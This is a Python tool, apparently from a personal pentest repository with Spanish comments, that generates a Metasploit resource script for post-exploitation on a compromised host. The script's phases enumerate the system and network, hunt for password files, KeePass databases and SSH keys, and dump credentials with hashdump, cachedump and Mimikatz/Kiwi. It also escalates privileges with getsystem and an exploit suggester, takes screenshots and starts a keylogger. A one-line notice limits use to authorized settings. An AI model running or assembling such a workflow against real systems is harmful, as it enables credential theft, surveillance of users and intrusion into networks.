#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║      post_recon.py  —  Reconocimiento Post-Explotación      ║
║              Constan4 / Cybersecurity Repository             ║
╚══════════════════════════════════════════════════════════════╝

ADVERTENCIA LEGAL:
    Solo para uso en entornos con autorización expresa.

Descripción:
    Genera un script .rc de Metasploit con comandos organizados
    por fases para el reconocimiento interno tras obtener una
    sesión Meterpreter activa.

    El .rc generado cubre:
    Fase 1 → Información del sistema (OS, usuario, privilegios, procesos)
    Fase 2 → Red interna (IPs, ARP, netstat, rutas — mapear la red interna)
    Fase 3 → Usuarios y grupos del sistema
    Fase 4 → Búsqueda de archivos sensibles (contraseñas, configs, docs)
    Fase 5 → Detección de software de seguridad (AV, EDR, firewalls)
    Fase 6 → Escalada de privilegios (local exploit suggester)
    Fase 7 → Capturas y credenciales

    Toda la salida se guarda automáticamente en un directorio
    organizado mediante el comando `spool` de Metasploit.

Requisitos:
    - Python 3.8+
    - Metasploit Framework con una sesión Meterpreter activa

Uso:
    python3 post_recon.py                           # Menú interactivo
    python3 post_recon.py --session 1               # Sesión 1, salida automática
    python3 post_recon.py --session 1 --os windows  # Forzar SO
    python3 post_recon.py --session 1 --output /root/audit/ --no-privesc
    python3 post_recon.py --session 1 --fases sistema,red,usuarios

    Lanzar el .rc generado:
    msfconsole -r post_recon_session1_TIMESTAMP.rc

Autor:  Constan4
Repo:   https://github.com/Constan4/Cybersecurity
"""

import argparse
import os
import sys
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional


# ══════════════════════════════════════════════════════════════
# COLORES
# ══════════════════════════════════════════════════════════════

class C:
    ROJO     = '\033[91m'
    VERDE    = '\033[92m'
    AMARILLO = '\033[93m'
    AZUL     = '\033[94m'
    MAGENTA  = '\033[95m'
    CYAN     = '\033[96m'
    GRIS     = '\033[90m'
    NEGRITA  = '\033[1m'
    RESET    = '\033[0m'

    @staticmethod
    def off() -> None:
        for a in ['ROJO','VERDE','AMARILLO','AZUL','MAGENTA','CYAN','GRIS','NEGRITA','RESET']:
            setattr(C, a, '')


# ══════════════════════════════════════════════════════════════
# DEFINICIÓN DE FASES Y COMANDOS
# ══════════════════════════════════════════════════════════════

# Estructura de cada comando:
# {
#   "cmd":     string del comando Meterpreter/msf,
#   "desc":    descripción de lo que hace,
#   "so":      ["windows", "linux", "any"] — sistema operativo compatible,
#   "priv":    bool — requiere SYSTEM/root
# }

FASES: Dict[str, Dict] = {

    "sistema": {
        "titulo": "INFORMACIÓN DEL SISTEMA",
        "descripcion": "OS, usuario actual, privilegios y procesos activos",
        "comandos": [
            {
                "cmd":  "sysinfo",
                "desc": "Nombre del equipo, SO, arquitectura, idioma",
                "so":   "any", "priv": False
            },
            {
                "cmd":  "getuid",
                "desc": "Usuario bajo el que corre Meterpreter",
                "so":   "any", "priv": False
            },
            {
                "cmd":  "getpid",
                "desc": "PID del proceso de Meterpreter",
                "so":   "any", "priv": False
            },
            {
                "cmd":  "getprivs",
                "desc": "Privilegios habilitados en el token actual",
                "so":   "any", "priv": False
            },
            {
                "cmd":  "ps",
                "desc": "Lista completa de procesos con usuario y ruta",
                "so":   "any", "priv": False
            },
            {
                "cmd":  "run post/windows/gather/enum_logged_on_users",
                "desc": "Usuarios con sesión activa en el sistema",
                "so":   "windows", "priv": False
            },
            {
                "cmd":  "run post/multi/gather/env",
                "desc": "Variables de entorno (PATH, TEMP, USERNAME...)",
                "so":   "any", "priv": False
            },
        ],
    },

    "red": {
        "titulo": "RED INTERNA",
        "descripcion": "IPs, vecinos ARP, conexiones activas y rutas",
        "comandos": [
            {
                "cmd":  "ipconfig",
                "desc": "Interfaces de red, IPs y máscaras (Windows)",
                "so":   "windows", "priv": False
            },
            {
                "cmd":  "ifconfig",
                "desc": "Interfaces de red, IPs y máscaras (Linux)",
                "so":   "linux", "priv": False
            },
            {
                "cmd":  "arp",
                "desc": "Tabla ARP — otros hosts detectados en la red local",
                "so":   "any", "priv": False
            },
            {
                "cmd":  "netstat",
                "desc": "Conexiones TCP/UDP activas y puertos en escucha",
                "so":   "any", "priv": False
            },
            {
                "cmd":  "route",
                "desc": "Tabla de rutas — detectar segmentos de red interna",
                "so":   "any", "priv": False
            },
            {
                "cmd":  "run post/windows/gather/enum_shares",
                "desc": "Recursos compartidos SMB del sistema",
                "so":   "windows", "priv": False
            },
            {
                "cmd":  "run post/multi/gather/ping_sweep RHOSTS=192.168.1.0/24",
                "desc": "Ping sweep del segmento local (ajustar RHOSTS)",
                "so":   "any", "priv": False
            },
        ],
    },

    "usuarios": {
        "titulo": "USUARIOS Y GRUPOS",
        "descripcion": "Cuentas locales, grupos y políticas de contraseñas",
        "comandos": [
            {
                "cmd":  "run post/windows/gather/enum_logged_on_users",
                "desc": "Usuarios con sesión iniciada actualmente",
                "so":   "windows", "priv": False
            },
            {
                "cmd":  "run post/windows/gather/enum_domain",
                "desc": "Información del dominio Active Directory (si aplica)",
                "so":   "windows", "priv": False
            },
            {
                "cmd":  "shell",
                "desc": "--- Abrir shell para comandos manuales (Windows) ---",
                "so":   "windows", "priv": False
            },
            {
                "cmd":  "# net user                   # Usuarios locales",
                "desc": "Listar cuentas de usuario locales",
                "so":   "windows", "priv": False
            },
            {
                "cmd":  "# net localgroup              # Grupos locales",
                "desc": "Listar grupos locales",
                "so":   "windows", "priv": False
            },
            {
                "cmd":  "# net localgroup Administrators  # Miembros del grupo Admin",
                "desc": "Ver quién es administrador local",
                "so":   "windows", "priv": False
            },
            {
                "cmd":  "# exit",
                "desc": "Volver a Meterpreter",
                "so":   "windows", "priv": False
            },
        ],
    },

    "archivos": {
        "titulo": "BÚSQUEDA DE ARCHIVOS SENSIBLES",
        "descripcion": "Localizar contraseñas, configuraciones, documentos y bases de datos",
        "comandos": [
            {
                "cmd":  "search -f *.txt -d C:\\Users",
                "desc": "Archivos de texto en el directorio de usuarios",
                "so":   "windows", "priv": False
            },
            {
                "cmd":  "search -f password* -d C:\\",
                "desc": "Archivos con 'password' en el nombre",
                "so":   "windows", "priv": False
            },
            {
                "cmd":  "search -f *.kdbx -d C:\\",
                "desc": "Bases de datos KeePass (contraseñas)",
                "so":   "windows", "priv": False
            },
            {
                "cmd":  "search -f *.config -d C:\\inetpub",
                "desc": "Configs de IIS (pueden tener credenciales de BD)",
                "so":   "windows", "priv": False
            },
            {
                "cmd":  "search -f id_rsa -d C:\\Users",
                "desc": "Claves privadas SSH",
                "so":   "windows", "priv": False
            },
            {
                "cmd":  "search -f unattend.xml -d C:\\",
                "desc": "Archivo de instalación desatendida (puede tener contraseña admin)",
                "so":   "windows", "priv": False
            },
            {
                "cmd":  "search -f *.vnc -d C:\\",
                "desc": "Configuraciones VNC (pueden tener contraseñas)",
                "so":   "windows", "priv": False
            },
            {
                "cmd":  "run post/windows/gather/enum_applications",
                "desc": "Software instalado en el sistema",
                "so":   "windows", "priv": False
            },
            {
                "cmd":  "run post/windows/gather/dumplinks",
                "desc": "Archivos recientes del usuario (LNK files)",
                "so":   "windows", "priv": False
            },
            {
                "cmd":  "search -f *.txt -d /home",
                "desc": "Archivos de texto en /home (Linux)",
                "so":   "linux", "priv": False
            },
            {
                "cmd":  "search -f id_rsa -d /home",
                "desc": "Claves privadas SSH en /home (Linux)",
                "so":   "linux", "priv": False
            },
        ],
    },

    "credenciales": {
        "titulo": "BÚSQUEDA DE CREDENCIALES",
        "descripcion": "Extraer hashes, contraseñas en texto plano y tokens",
        "comandos": [
            {
                "cmd":  "run post/windows/gather/credentials/credential_collector",
                "desc": "Recopilar credenciales guardadas (browsers, Windows Credential Manager)",
                "so":   "windows", "priv": False
            },
            {
                "cmd":  "run post/windows/gather/cachedump",
                "desc": "Extraer hashes de contraseñas cacheadas del dominio",
                "so":   "windows", "priv": True
            },
            {
                "cmd":  "run post/windows/gather/hashdump",
                "desc": "Extraer hashes NTLM de la base SAM local",
                "so":   "windows", "priv": True
            },
            {
                "cmd":  "load kiwi",
                "desc": "Cargar Mimikatz integrado (Kiwi) — requiere SYSTEM",
                "so":   "windows", "priv": True
            },
            {
                "cmd":  "creds_all",
                "desc": "Extraer todas las credenciales con Kiwi (tras load kiwi)",
                "so":   "windows", "priv": True
            },
            {
                "cmd":  "lsa_dump_sam",
                "desc": "Volcar hashes SAM con Kiwi",
                "so":   "windows", "priv": True
            },
            {
                "cmd":  "run post/linux/gather/hashdump",
                "desc": "Extraer hashes de /etc/shadow (Linux, requiere root)",
                "so":   "linux", "priv": True
            },
        ],
    },

    "seguridad": {
        "titulo": "DETECCIÓN DE SOFTWARE DE SEGURIDAD",
        "descripcion": "Identificar AV, EDR y firewalls activos",
        "comandos": [
            {
                "cmd":  "run post/windows/gather/enum_av",
                "desc": "Detectar antivirus instalados y su estado",
                "so":   "windows", "priv": False
            },
            {
                "cmd":  "run post/multi/manage/system_time",
                "desc": "Hora del sistema (útil para correlación de logs)",
                "so":   "any", "priv": False
            },
            {
                "cmd":  "run post/windows/gather/enum_patches",
                "desc": "Parches de seguridad instalados (KB...)",
                "so":   "windows", "priv": False
            },
        ],
    },

    "escalada": {
        "titulo": "ESCALADA DE PRIVILEGIOS",
        "descripcion": "Buscar vectores para escalar a administrador o SYSTEM",
        "comandos": [
            {
                "cmd":  "getsystem",
                "desc": "Intentar escalar a SYSTEM automáticamente",
                "so":   "windows", "priv": False
            },
            {
                "cmd":  "getuid",
                "desc": "Verificar si getsystem tuvo éxito",
                "so":   "any", "priv": False
            },
            {
                "cmd":  "run post/multi/recon/local_exploit_suggester",
                "desc": "Buscar exploits locales aplicables (puede tardar varios minutos)",
                "so":   "any", "priv": False
            },
        ],
    },

    "capturas": {
        "titulo": "CAPTURAS Y ESPIONAJE",
        "descripcion": "Captura de pantalla, teclado y cámara",
        "comandos": [
            {
                "cmd":  "screenshot",
                "desc": "Captura de pantalla del escritorio del usuario",
                "so":   "any", "priv": False
            },
            {
                "cmd":  "keyscan_start",
                "desc": "Iniciar keylogger (registra todas las pulsaciones)",
                "so":   "any", "priv": False
            },
        ],
    },
}

# Orden por defecto de las fases
ORDEN_FASES_DEFAULT = [
    "sistema", "red", "usuarios", "archivos",
    "seguridad", "escalada", "credenciales", "capturas"
]


# ══════════════════════════════════════════════════════════════
# GENERADOR DEL SCRIPT .RC
# ══════════════════════════════════════════════════════════════

def generar_rc(
    session_id:   int,
    so:           str,
    output_dir:   str,
    fases:        List[str],
    incluir_priv: bool,
) -> str:
    """
    Genera el contenido completo del script .rc de Metasploit.

    Args:
        session_id:   ID de la sesión Meterpreter.
        so:           Sistema operativo objetivo ('windows', 'linux', 'any').
        output_dir:   Directorio donde Metasploit guardará los logs.
        fases:        Lista de fases a incluir.
        incluir_priv: Si incluir comandos que requieren SYSTEM/root.

    Returns:
        String con el contenido completo del archivo .rc.
    """
    ts = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    log_file = os.path.join(output_dir, f"recon_session{session_id}.txt")

    lineas: List[str] = [
        "#" + "═" * 65,
        f"# post_recon.rc — Reconocimiento Post-Explotación",
        f"# Generado por post_recon.py el {ts}",
        f"# Sesión: {session_id}  |  SO: {so}",
        f"# Fases incluidas: {', '.join(fases)}",
        "#" + "═" * 65,
        "",
        "# Iniciar captura de toda la salida en un archivo de log",
        f"spool {log_file}",
        "",
        f"# Interactuar con la sesión {session_id}",
        f"sessions -i {session_id}",
        "",
    ]

    for nombre_fase in fases:
        if nombre_fase not in FASES:
            continue

        fase = FASES[nombre_fase]
        comandos_fase = [
            c for c in fase["comandos"]
            if (c["so"] == "any" or c["so"] == so)
            and (incluir_priv or not c["priv"])
        ]

        if not comandos_fase:
            continue

        lineas += [
            "#" + "─" * 65,
            f"# FASE: {fase['titulo']}",
            f"# {fase['descripcion']}",
            "#" + "─" * 65,
            "",
        ]

        for cmd_info in comandos_fase:
            lineas.append(f"# → {cmd_info['desc']}")
            lineas.append(cmd_info["cmd"])
            lineas.append("")

    # Pie del script
    lineas += [
        "#" + "─" * 65,
        "# FIN DEL RECONOCIMIENTO",
        "#" + "─" * 65,
        "",
        "# Detener captura de log",
        "spool off",
        "",
        f'# Log guardado en: {log_file}',
        "# Revisar el log para analizar los resultados",
    ]

    return "\n".join(lineas)


# ══════════════════════════════════════════════════════════════
# GENERADOR DEL INFORME MARKDOWN (PLANTILLA)
# ══════════════════════════════════════════════════════════════

def generar_plantilla_informe(session_id: int, so: str, output_dir: str) -> str:
    """
    Genera una plantilla Markdown para documentar los hallazgos
    de la post-explotación durante la auditoría.

    Returns:
        String con el contenido de la plantilla .md.
    """
    ts = datetime.now().strftime("%d/%m/%Y")

    plantilla = f"""# Informe de Post-Explotación — Sesión {session_id}

**Fecha:** {ts}
**Sesión Meterpreter:** {session_id}
**Sistema Operativo:** {so}
**Auditor:** [Tu nombre]

---

## Resumen Ejecutivo

> Describir brevemente el alcance y los hallazgos más importantes.

---

## 1. Información del Sistema

| Campo | Valor |
|-------|-------|
| Hostname | |
| Sistema Operativo | |
| Arquitectura | |
| Usuario inicial | |
| Privilegios iniciales | |
| Usuario tras escalada | |

---

## 2. Red Interna Descubierta

### Interfaces de red
```
(pegar salida de ipconfig/ifconfig)
```

### Hosts descubiertos (ARP)
| IP | MAC | Hostname | Notas |
|----|-----|---------|-------|
| | | | |

### Puertos en escucha internos
```
(pegar salida de netstat relevante)
```

---

## 3. Usuarios del Sistema

| Usuario | Grupo | Observaciones |
|---------|-------|---------------|
| | | |

---

## 4. Archivos Sensibles Encontrados

| Ruta | Tipo | Contenido relevante |
|------|------|---------------------|
| | | |

---

## 5. Credenciales Obtenidas

> ⚠️ Almacenar solo en informe cifrado. No commitear al repositorio.

| Usuario | Hash/Contraseña | Servicio | Validado |
|---------|-----------------|---------|----------|
| | | | |

---

## 6. Escalada de Privilegios

**Técnica utilizada:** 
**Resultado:** 
**Módulo Metasploit:** 

---

## 7. Persistencia Establecida

| Técnica | Ruta/Clave | Activa | Limpiada |
|---------|------------|--------|----------|
| | | | |

---

## 8. Evidencias

- [ ] Capturas de pantalla guardadas en `{output_dir}/screenshots/`
- [ ] Log completo en `{output_dir}/recon_session{session_id}.txt`
- [ ] Hashes guardados en `{output_dir}/hashes.txt` (cifrado)

---

## 9. Conclusiones y Recomendaciones

### Hallazgos críticos
1. 

### Recomendaciones
1. 

---

*Informe generado con post_recon.py — Constan4/Cybersecurity*
"""
    return plantilla


# ══════════════════════════════════════════════════════════════
# SALIDA EN PANTALLA
# ══════════════════════════════════════════════════════════════

def banner() -> None:
    print(f"""{C.CYAN}{C.NEGRITA}
╔══════════════════════════════════════════════════════════╗
║      post_recon.py  —  v1.0                             ║
║   Reconocimiento Post-Explotación para Metasploit        ║
╚══════════════════════════════════════════════════════════╝
{C.RESET}""")


def mostrar_fases() -> None:
    """Muestra todas las fases disponibles con su descripción."""
    print(f"\n  {C.NEGRITA}Fases disponibles:{C.RESET}\n")
    for nombre, datos in FASES.items():
        n_cmds = len(datos["comandos"])
        print(f"  {C.VERDE}{nombre:<15}{C.RESET} {datos['descripcion']} ({n_cmds} comandos)")


def mostrar_resumen_rc(rc_path: str, md_path: str, session_id: int,
                       fases: List[str], output_dir: str) -> None:
    """Muestra el resumen de los archivos generados y los pasos a seguir."""
    sep = '═' * 57
    print(f"\n  {C.CYAN}{C.NEGRITA}{sep}{C.RESET}")
    print(f"  {C.CYAN}{C.NEGRITA}  ARCHIVOS GENERADOS{C.RESET}")
    print(f"  {C.CYAN}{sep}{C.RESET}\n")

    print(f"  {C.VERDE}✓{C.RESET} Script .rc  → {C.NEGRITA}{rc_path}{C.RESET}")
    print(f"  {C.VERDE}✓{C.RESET} Plantilla   → {C.NEGRITA}{md_path}{C.RESET}")
    print(f"  {C.GRIS}  Logs en    → {output_dir}{C.RESET}")

    print(f"\n  {C.NEGRITA}{'─'*55}{C.RESET}")
    print(f"  {C.NEGRITA}FASES INCLUIDAS:{C.RESET}")
    for f in fases:
        if f in FASES:
            print(f"  {C.CYAN}  ✓{C.RESET} {FASES[f]['titulo']}")

    print(f"\n  {C.NEGRITA}{'─'*55}{C.RESET}")
    print(f"  {C.NEGRITA}PASOS A SEGUIR:{C.RESET}\n")
    print(f"  {C.CYAN}1. Asegúrate de tener una sesión Meterpreter activa (ID: {session_id}){C.RESET}")
    print(f"     {C.AMARILLO}msfconsole -q{C.RESET}")
    print(f"     {C.AMARILLO}msf > sessions -l{C.RESET}\n")
    print(f"  {C.CYAN}2. Lanzar el script de reconocimiento:{C.RESET}")
    print(f"     {C.AMARILLO}msfconsole -r {rc_path}{C.RESET}\n")
    print(f"  {C.CYAN}3. Analizar los resultados en:{C.RESET}")
    print(f"     {C.AMARILLO}cat {output_dir}/recon_session{session_id}.txt{C.RESET}\n")
    print(f"  {C.CYAN}4. Documentar hallazgos en la plantilla:{C.RESET}")
    print(f"     {C.AMARILLO}{md_path}{C.RESET}\n")
    print(f"  {C.VERDE}{C.NEGRITA}{sep}{C.RESET}\n")


# ══════════════════════════════════════════════════════════════
# CLI Y PUNTO DE ENTRADA
# ══════════════════════════════════════════════════════════════

def parsear_argumentos() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="post_recon.py",
        description=(
            "Genera un script .rc de Metasploit para reconocimiento\n"
            "post-explotación automatizado en una sesión Meterpreter."
        ),
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
ejemplos:
  python3 post_recon.py                               # Modo interactivo
  python3 post_recon.py --session 1                   # Sesión 1, todas las fases
  python3 post_recon.py --session 1 --os linux        # Objetivo Linux
  python3 post_recon.py --session 2 --no-privesc      # Sin comandos que necesitan SYSTEM
  python3 post_recon.py --session 1 --fases sistema,red,archivos
  python3 post_recon.py --list-fases                  # Ver fases disponibles
        """
    )

    parser.add_argument(
        "--session", "-s",
        metavar="ID",
        type=int,
        help="ID de la sesión Meterpreter activa"
    )
    parser.add_argument(
        "--os",
        metavar="SO",
        choices=["windows", "linux"],
        default="windows",
        help="Sistema operativo objetivo: windows (default) | linux"
    )
    parser.add_argument(
        "--output", "-o",
        metavar="DIR",
        help="Directorio de salida para logs y archivos generados"
    )
    parser.add_argument(
        "--fases",
        metavar="FASES",
        help="Fases a incluir separadas por coma (ej: sistema,red,archivos)"
    )
    parser.add_argument(
        "--no-privesc",
        action="store_true",
        help="Excluir la fase de escalada de privilegios"
    )
    parser.add_argument(
        "--no-priv-cmds",
        action="store_true",
        help="Excluir comandos que requieren SYSTEM/root"
    )
    parser.add_argument(
        "--list-fases",
        action="store_true",
        help="Mostrar las fases disponibles y salir"
    )
    parser.add_argument(
        "--no-color",
        action="store_true",
        help="Desactivar colores ANSI"
    )

    return parser.parse_args()


def modo_interactivo() -> tuple:
    """Modo interactivo para configurar la generación del .rc."""
    mostrar_fases()

    print(f"\n  {C.NEGRITA}{'─'*55}{C.RESET}")

    # Sesión
    while True:
        sid_str = input(f"\n  {C.AMARILLO}[?]{C.RESET} ID de la sesión Meterpreter: ").strip()
        try:
            session_id = int(sid_str)
            break
        except ValueError:
            print(f"  {C.ROJO}[!] Introduce un número válido.{C.RESET}")

    # SO
    so_input = input(f"  {C.AMARILLO}[?]{C.RESET} Sistema operativo [windows/linux] (Enter = windows): ").strip().lower()
    so = so_input if so_input in ("windows", "linux") else "windows"

    # Fases
    fases_str = input(
        f"  {C.AMARILLO}[?]{C.RESET} Fases a incluir (Enter = todas):\n"
        f"  {C.GRIS}    Opciones: {', '.join(ORDEN_FASES_DEFAULT)}{C.RESET}\n"
        f"  {C.AMARILLO}  →{C.RESET} "
    ).strip()

    if fases_str:
        fases = [f.strip() for f in fases_str.split(",") if f.strip() in FASES]
        if not fases:
            print(f"  {C.AMARILLO}[!] Ninguna fase válida. Usando todas.{C.RESET}")
            fases = ORDEN_FASES_DEFAULT
    else:
        fases = ORDEN_FASES_DEFAULT

    # Comandos privilegiados
    priv_input = input(
        f"  {C.AMARILLO}[?]{C.RESET} ¿Incluir comandos que requieren SYSTEM/root? [s/N]: "
    ).strip().lower()
    incluir_priv = priv_input in ("s", "si", "sí", "y", "yes")

    return session_id, so, fases, incluir_priv


def main() -> None:
    args = parsear_argumentos()

    if args.no_color:
        C.off()

    banner()

    if args.list_fases:
        mostrar_fases()
        print()
        sys.exit(0)

    # Modo interactivo o por argumentos
    if args.session is None:
        session_id, so, fases, incluir_priv = modo_interactivo()
    else:
        session_id  = args.session
        so          = args.os

        if args.fases:
            fases = [f.strip() for f in args.fases.split(",") if f.strip() in FASES]
            if not fases:
                print(f"  {C.AMARILLO}[!] Ninguna fase válida. Usando todas.{C.RESET}")
                fases = ORDEN_FASES_DEFAULT
        else:
            fases = [f for f in ORDEN_FASES_DEFAULT if not (args.no_privesc and f == "escalada")]

        incluir_priv = not args.no_priv_cmds

    # Directorio de salida
    ts_dir = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_dir = args.output or f"./post_recon_session{session_id}_{ts_dir}"
    Path(output_dir).mkdir(parents=True, exist_ok=True)

    # Nombres de los archivos generados
    ts_file = datetime.now().strftime("%Y%m%d_%H%M%S")
    rc_path  = f"post_recon_session{session_id}_{ts_file}.rc"
    md_path  = os.path.join(output_dir, f"informe_session{session_id}.md")

    print(f"\n  {C.CYAN}[*] Generando script .rc...{C.RESET}")

    # Generar .rc
    contenido_rc = generar_rc(session_id, so, output_dir, fases, incluir_priv)
    with open(rc_path, "w", encoding="utf-8") as f:
        f.write(contenido_rc)
    print(f"  {C.VERDE}[✓] Script .rc generado: {rc_path}{C.RESET}")

    # Generar plantilla de informe
    contenido_md = generar_plantilla_informe(session_id, so, output_dir)
    with open(md_path, "w", encoding="utf-8") as f:
        f.write(contenido_md)
    print(f"  {C.VERDE}[✓] Plantilla de informe: {md_path}{C.RESET}")

    # Mostrar resumen
    mostrar_resumen_rc(rc_path, md_path, session_id, fases, output_dir)


if __name__ == "__main__":
    main()
